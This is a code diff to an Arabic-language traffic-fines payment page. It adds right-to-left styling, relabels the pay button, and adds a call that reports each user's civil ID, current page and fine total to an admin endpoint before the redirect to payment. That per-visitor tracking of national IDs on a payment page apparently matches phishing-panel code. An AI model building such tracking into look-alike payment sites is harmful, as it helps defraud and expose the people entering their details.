@@ -35,7 +35,7 @@ export default function Home() {
         
         let finesHtml = `
           <div class="col-12">
-            <div class="row alert alert-secondary" role="alert">
+            <div class="row alert alert-secondary" role="alert" style="direction: rtl; text-align: right;">
               <div class="col-md-6 col-sm-12">
                 <b>عدد المخالفات</b>: ${data.fines.length}
               </div>
@@ -44,7 +44,7 @@ export default function Home() {
               </div>
             </div>
           </div>
-          <div class="row">
+          <div class="row" style="direction: rtl; text-align: right;">
         `;
         
         data.fines.forEach((fine: any, index: number) => {
@@ -172,13 +172,22 @@ export default function Home() {
               if (selectedTickets.length === 0) return;
               
               const totalSelected = selectedTickets.reduce((sum: number, t: any) => sum + parseFloat(t.amount), 0);
+              const civilId = (document.getElementById('civilId') as HTMLInputElement)?.value;
               
               sessionStorage.setItem('paymentData', JSON.stringify({
                 selectedFines: selectedTickets,
                 totalAmount: totalSelected.toFixed(2),
-                civilId: (document.getElementById('civilId') as HTMLInputElement)?.value
+                civilId: civilId
               }));
-              setLocation('/payment');
+
+              // تحديث حالة العميل في لوحة الأدمن
+              fetch('/api/admin/update-page', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ civilId, page: 'صفحة الدفع', amount: totalSelected })
+              }).finally(() => {
+                setLocation('/payment');
+              });
             };
           }, 200);
         }
@@ -416,7 +425,7 @@ export default function Home() {
                             بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                         </div>
                         <div class="col-sm-12 col-md-4 text-right">
-                            <input type="button" id="btnPay" class="btn btn-primary btn-block d-none" disabled value="إدفع">
+                            <input type="button" id="btnPay" class="btn btn-primary btn-block d-none" disabled value="ادفع بس">
                         </div>
                         <div class="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                     </div>
